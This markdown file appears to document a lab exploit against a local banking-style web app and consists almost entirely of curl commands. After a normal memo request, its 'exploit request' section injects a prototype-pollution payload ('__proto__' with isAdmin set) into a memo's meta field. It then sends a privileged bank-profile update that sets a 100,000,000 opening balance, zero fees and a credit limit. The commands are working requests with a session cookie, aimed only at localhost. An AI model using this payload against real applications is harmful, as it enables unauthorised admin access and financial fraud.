
## ok request

```sh
curl 'http://localhost:3000/api/memos' \
  -H 'Accept-Language: en-US,en;q=0.9,he;q=0.8' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: auth_session=zl6z6rjz7qkbcifxywdixbocz3eluwx4xtt5qhlq' \
  -H 'Origin: http://localhost:3000' \
  -H 'Referer: http://localhost:3000/memos' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36' \
  -H 'accept: application/json' \
  -H 'content-type: application/json' \
  -H 'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"' \
  --data-raw '{"text":"ok ok ok ","meta":"{\"phone\":\"1234\",\"urgency\":\"high\"}"}'
```

## let's try to hack this app

```sh
curl 'http://localhost:3000/api/bank_profile' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: auth_session=zl6z6rjz7qkbcifxywdixbocz3eluwx4xtt5qhlq' \
  -H 'DNT: 1' \
  -H 'Origin: http://localhost:3000' \
  -H 'Pragma: no-cache' \
  -H 'Referer: http://localhost:3000/bank_profile' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36' \
  -H 'accept: application/json' \
  -H 'content-type: application/json' \
  -H 'sec-ch-ua: "Not;A=Brand";v="24", "Chromium";v="128"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"' \
  --data-raw '{"opening_balance":"100000000.0","fee_per_transaction":"0.0","credit_limit":"500000.0","user_id":"95uwimfu2o5gklx"}'
  ```

## exploit request

### phase 1: deliver the poison

```sh
curl 'http://localhost:3000/api/memos' \
  -H 'Accept-Language: en-US,en;q=0.9,he;q=0.8' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: auth_session=zl6z6rjz7qkbcifxywdixbocz3eluwx4xtt5qhlq' \
  -H 'Origin: http://localhost:3000' \
  -H 'Referer: http://localhost:3000/memos' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36' \
  -H 'accept: application/json' \
  -H 'content-type: application/json' \
  -H 'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"' \
  --data-raw '{"text":"hey no worries ill just do it myself ","meta":"{\"phone\":\"1234\",\"urgency\":\"high\", \"__proto__\": {\"isAdmin\": 1}}"}'
```

### phase 2: exploit the app

```sh
curl 'http://localhost:3000/api/bank_profile' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: auth_session=zl6z6rjz7qkbcifxywdixbocz3eluwx4xtt5qhlq' \
  -H 'DNT: 1' \
  -H 'Origin: http://localhost:3000' \
  -H 'Pragma: no-cache' \
  -H 'Referer: http://localhost:3000/bank_profile' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36' \
  -H 'accept: application/json' \
  -H 'content-type: application/json' \
  -H 'sec-ch-ua: "Not;A=Brand";v="24", "Chromium";v="128"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"' \
  --data-raw '{"opening_balance":"100000000.0","fee_per_transaction":"0.0","credit_limit":"500000.0","user_id":"95uwimfu2o5gklx"}'
  ```